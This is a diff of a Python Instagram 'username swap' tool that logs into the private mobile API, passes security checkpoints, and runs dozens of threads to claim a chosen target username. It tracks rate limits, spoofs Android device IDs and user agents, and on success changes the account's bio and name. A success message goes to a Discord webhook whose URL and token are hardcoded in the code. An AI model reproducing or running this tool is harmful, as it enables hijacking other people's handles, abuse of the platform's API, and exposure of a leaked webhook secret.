@@ -7,16 +7,6 @@ from termcolor import colored
 
 colorama.init()
 
-
-
-
-
-
-
-
-
-
-
 timestamp = str(int(time.time()))
 
 def RandomStringUpper(n = 10):
@@ -177,12 +167,12 @@ class sessting:
         return 'android-' + m.hexdigest()[:16]
 
 
-def inputc(NewLine,mark,color,text):
-    if NewLine:
-        NewLine = "\n"
+def inputc(Frist_NewLine,mark,color,text):
+    if Frist_NewLine:
+        Frist_NewLine = "\n"
     
     
-    print(f"{NewLine}\r{Design.qube} {colored(text=f'{mark}',color=f'{color}')} {Design.qube2} {text} {colored(text='',color=Design.white)}",end='')
+    print(f"{Frist_NewLine}\r{Design.qube} {colored(text=f'{mark}',color=f'{color}')} {Design.qube2} {text} {colored(text='',color=Design.white)}",end='')
 
 
 
@@ -206,9 +196,6 @@ class login:
         headers['Connection'] = 'close'
         return headers
         
-        
-        
-        
     def checkpoint(self):
         info = requests.get(f"https://i.instagram.com/api/v1{self.req.json()['challenge']['api_path']}", headers=self.headers_login(), cookies=self.coo)
         step_data = info.json()["step_data"]
@@ -216,22 +203,24 @@ class login:
             try:
                 phone = info.json()["step_data"]["phone_number"]
                 print(f'[0] phone_number : {phone}')
+                inputc(False,"0",Design.green,f"phone_number : {phone}\n")
+                
             except:
                 pass
         elif "email" in step_data:
             try:
                 email = info.json()["step_data"]["email"]
-                print(f'[1] email : {email}')
+                inputc(False,"1",Design.green,f"Email : {email}\n")
             except:
                 pass
 
         else:
-            print("unknown verification method")
+            inputc(False,"?",Design.red,f"unknown verification method\n")
             input()
             exit()
         return self.send_choice()
     def send_choice(self):
-        choice = input('choice : ')
+        inputc(False,"/",Design.red,f"Choice : ");choice = input()
         data = {}
         data['choice'] = str(choice)
         data['_uuid'] = uu
@@ -240,45 +229,41 @@ class login:
         challnge = self.req.json()['challenge']['api_path']
         self.send = requests.post(f"https://i.instagram.com/api/v1{challnge}",headers=self.headers_login(), data=data, cookies=self.coo)
         contact_point = self.send.json()["step_data"]["contact_point"]
-        print(f'code sent to : {contact_point}')
+        inputc(False,"+",Design.green,f"Code sent to : {contact_point}\n")
         return self.get_code()
     def get_code(self):
-        try:
-            code = input("code : ")
-            data = {}
-            data['security_code'] = str(code),
-            data['_uuid'] = uu,
-            data['_uid'] = uu,
-            data['_csrftoken'] = 'massing'
-            path = self.req.json()['challenge']['api_path']
-            send_code = requests.post(f"https://i.instagram.com/api/v1{path}", headers=self.headers_login(), data=data, cookies=self.coo)
-            if "logged_in_user" in send_code.text:
-                print(f'[+] Login Successfully as @{self.username} press Enter');input()
-                self.coo = self.req.cookies
-                self.token = self.coo.get("csrftoken")
-                self.mid = self.coo.get("mid")
-                self.sessionid = self.coo.get("sessionid")
-                print(self.sessionid)
-                os.system("cls") or Design.clearConsle()
+        inputc(False,"/",Design.red,f"Code : ");code = input()
+        data = {}
+        data['security_code'] = str(code),
+        data['_uuid'] = uu,
+        data['_uid'] = uu,
+        data['_csrftoken'] = 'massing'
+        path = self.req.json()['challenge']['api_path']
+        self.send_code = requests.post(f"https://i.instagram.com/api/v1{path}", headers=self.headers_login(), data=data, cookies=self.coo)
+        if "logged_in_user" in self.send_code.text:
+            inputc(False,"+",Design.green,"Sucssfully Loged In Press Enter ",True)
+            self.coo = self.send_code.cookies
+            self.token = self.coo.get("csrftoken")
+            self.mid = self.coo.get("mid")
+            self.sessionid = self.coo.get("sessionid")
+            #print(self.sessionid)
+            os.system("cls") or Design.clearConsle()
+            print(colored(Design.banner,"red"))
+        else:
+            regx_error = re.search(r'"message":"(.*?)",', self.send_code).group(1)
+            inputc(False,"-",Design.red,f"{regx_error}")
+            inputc(False,"?",Design.red,f"Do You Want Try Agin {Design.reda}[Y/N]{Design.WHITE} : ");ask = input()
+            if ask.lower() == "y":
+                sleep(1)
+                return self.get_code()
             else:
-                regx_error = re.search(r'"message":"(.*?)",', send_code).group(1)
-                print(regx_error)
-                ask = input("Code is Not Work Do You Want Try Agin [Y/N] : ")
-                if ask.lower() == "y":
-                    sleep(1)
-                    return self.get_code()
-                else:
-                    exit()
-        except:
-            print("accepted Done")
-            return self.Login()
+                exit()
 
         
-        
     def Login(self):
-        self.username = input(f'[+] UserName? : ')
+        inputc(False,"/",Design.green,f"UserName? : ");self.username = input()
         self.DeviceID = self.sesstings.generate_DeviceId(self.username)
-        self.passwordd = input(f'[+] Password? : ')
+        inputc(False,"/",Design.green,f"Password? :  ");self.passwordd = input()
         data = {}
         data['guid'] = uu
         data['enc_password'] = f"#PWD_INSTAGRAM:0:{timestamp}:{self.passwordd}"
@@ -288,50 +273,36 @@ class login:
 
         self.req = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=self.headers_login(), data=data)
         if "logged_in_user" in self.req.text:
-            print(f'[+] Login Successfully as @{self.username} press Enter');input()
+            inputc(False,"+",Design.green,"Sucssfully Loged In Press Enter\n")
+            input()
             self.coo = self.req.cookies
             self.token = self.coo.get("csrftoken")
             self.mid = self.coo.get("mid")
             self.sessionid = self.coo.get("sessionid")
-            os.system("cls") or Design.clearConsle
+            os.system("cls") or Design.clearConsle()
+            print(colored(Design.banner,"red"))
         elif 'checkpoint_challenge_required' in self.req.text:
             self.coo = self.req.cookies
             self.token = self.coo.get("csrftoken")
             self.mid = self.coo.get("mid")
             self.sessionid = self.coo.get("sessionid")
-            print("SCURE FOUND ")
+            inputc(False,"/",Design.red,f"SCURE FOUND\n")
             return self.checkpoint()
         else:
             try:
                 regx_error = re.search(r'"message":"(.*?)",', self.req.text).group(1)
-                print(regx_error)
+                inputc(False,"-",Design.red,f"{regx_error}\n")
             except:
-                print(self.req.text)
-            ask = input("Something has gone wrong Do You Want Try Agin [Y/N] : ")
+                pass
+            inputc(False,"?",Design.red,f"Do You Want Try Agin {Design.reda}[Y/N]{Design.WHITE} : ");ask = input()
             if ask.lower() == "y":
                 sleep(1)
-                os.system("cls")
-                return self.login()
+                return self.Login()
             else:
                 input()
                 exit()
 
-class Signatures(object):
-        def __init__(self):
-                super(Signatures, self).__init__()
-                self.key = b"02271fcedc24c5849a7505120650925e2b4c5b041e0a0bb0f82f4d41cfcdc944"
- 
-        def gen_uuid(self):
-                return str(uuid.uuid4())
- 
-        def gen_device_id(self):
-                return "android-{}".format(hashlib.md5(self.gen_uuid().encode("utf-8")).hexdigest()[:16])
- 
-        def gen_signature(self, data):
-                return hmac.new(self.key, str.encode(data), hashlib.sha256).hexdigest()
- 
-        def sign_post_data(self, data):
-                return "signed_body={}.{}&ig_sig_key_version=4".format(self.gen_signature(data), data)
+
 
 class swap:
     def __init__(self) :
@@ -339,6 +310,8 @@ class swap:
         self.login = login()
         self.REQ = requests.session()
         self.sesstings1 = sessting()
+        self.cookies = None
+        self.Locks = Lock()
         print(colored(Design.banner,"red"))
         
         try:
@@ -354,10 +327,7 @@ class swap:
         self.Web_hook = self.json_sesstings["sesstings"]["Webhook"]
         self.url_imge = self.json_sesstings["sesstings"]["url_imge"]
         
-
-
         inputc(True,"?",Design.yellow,f"Do You want Login with Session {Design.reda}[Y/n]{Design.WHITE} : ");self.ask = input()
-        inputc(False,"?",Design.red,f"Do You want Auto Sesstings {Design.reda}[Y/n]{Design.WHITE} : ");self.auto = input()
     
 
         if self.ask.__contains__("y"):
@@ -369,7 +339,8 @@ class swap:
         self.run = True
         self.att = 0
         self.rl = 0
-        self.Locks  = Lock()
+        self.Rs = 0 
+        self.locks  = Lock()
         self.update_consent()
         inputc(False,"?",Design.blue,f"Do You Want Check Block {Design.reda}[Y/n]{Design.WHITE} :  ");self.check = input()
         if self.check.__contains__("y"):
@@ -377,21 +348,12 @@ class swap:
         inputc(False,"?",Design.green,"Target : ");self.Target = input()
         
         
-        
-        if self.auto.__contains__("y"):
-            auto = random.randint(25,50)
-            inputc(False,"+",Design.red,f"Threads = {auto} \n");print("\n")
-            Thread(target=self.Print).start()
-            autopy.alert.alert(f"Are you Ready?","DayLight Swap")
-            for i in range(auto):
-                Thread(target=self.swapper).start()
-        if self.auto.__contains__("n"):
-            inputc(False,"\\\\",Design.red,f"If Not Use Auto Sesstings {Design.reda}(Max Threads = 75){Design.WHITE}\n")
-            inputc(False,"?",Design.red,"Threads : ");self.Threads = int(input())
-            autopy.alert.alert(f"Are you Ready?","DayLight Swap")
-            Thread(target=self.Print).start()
-            for i in range(self.Threads):
-                Thread(target=self.swapper).start()
+        #inputc(False,"\\\\",Design.red,f"If Not Use Auto Sesstings {Design.reda}(Max Threads = 75){Design.WHITE}\n")
+        inputc(False,"?",Design.red,"Threads : ");self.Threads = int(input())
+        autopy.alert.alert(f"Are you Ready?","DayLight Swap")
+        Thread(target=self.Print).start()
+        for i in range(self.Threads):
+            Thread(target=self.swapper).start()
 
 
         
@@ -407,10 +369,10 @@ class swap:
     def Print(self):
         while self.run:
             for q in ["|","/","-","\\","|","/","-"]:
+                sleep(0.2)
                 print(f"\r[ {Design.GREEN}{q}{Design.WHITE} ] Attempt : {self.att} / Rate_Limit : {self.rl}",end="",flush=True)
 
     def update_consent(self):
-
         response = requests.post("https://i.instagram.com/api/v1/consent/update_dob/", headers={
                 "Accept": "*/*",
                 "Accept-Encoding": "gzip, deflate",
@@ -427,7 +389,7 @@ class swap:
             return self.get_info()
         else:
             inputc(True,"-",Design.red,f"Failed to consent to GDPR, use an IP that is not from Europe\n")
-            return False
+            input(),exit(0)
  
     def get_info(self):
         headers = {}
@@ -436,16 +398,15 @@ class swap:
         headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
         headers["Accept-Language"] = "en-US"
         headers["User-Agent"] = self.sesstings1.generateUSER_AGENT()
-        try:
-            get = self.REQ.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true",headers=headers,cookies={"sessionid":self.session}).text
-            self.user = re.search(r'"username":"(.*?)",',get).group(1)
-            self.email = re.search(r'"email":"(.*?)",',get).group(1)
-            inputc(False,"+",Design.green,f"Login sucssfully as {self.user}");input()
-            os.system("cls")  
-            Design.clearTermnal()
-            print(colored(Design.banner,"red"))
-        except:
-            inputc(True,"-",Design.red,f"Bad Seesion");input();exit(0)
+
+        get = self.REQ.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true",headers=headers,cookies={"sessionid":self.session}).text
+        self.user = re.search(r'"username":"(.*?)",',get).group(1)
+        self.email = re.search(r'"email":"(.*?)",',get).group(1)
+        #print(get)
+        inputc(False,"+",Design.green,f"Username : {self.user}\n");inputc(False,"+",Design.green,f"Email : {self.email}");input()
+        os.system("cls")  
+        Design.clearTermnal()
+        print(colored(Design.banner,"red"))
     def check_block(self):
         data = {}
         data["_uid"] = f"47641699268"
@@ -466,7 +427,8 @@ class swap:
 
     def sucssfully_swap(self):
         self.run = False
-        inputc(True,"$",Design.red,f"{self.Msg} {Design.reda}@{self.Target}")
+        #inputc(True,"$",Design.red,f"{self.Msg} {Design.reda}@{self.Target}")
+        print(f"\n\n{Design.WHITE}[ {Design.reda}${Design.WHITE} ] {self.Msg}  {Design.reda}@{self.Target}\n\n\n")
         self.REQ.post('https://i.instagram.com/api/v1/accounts/set_biography/', data={"raw_text": f"{self.bio}"},headers={"User-Agent": "Instagram 152.0.0.1.60 Android", "Cookie": "sessionid=" + self.session})
         self.REQ.post("https://i.instagram.com/api/v1/accounts/set_phone_and_name/",data={"first_name":f"{self.name}"},headers={"User-Agent": "Instagram 152.0.0.1.60 Android","Cookie": "sessionid=" + self.session})
         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/899788444966985730/Uy9-NNXthTA3ncdGqNSTfteDFZYcWASapaKaJObTMr_fuIxJ7dIkzcLtDMT8OOURuJIr')
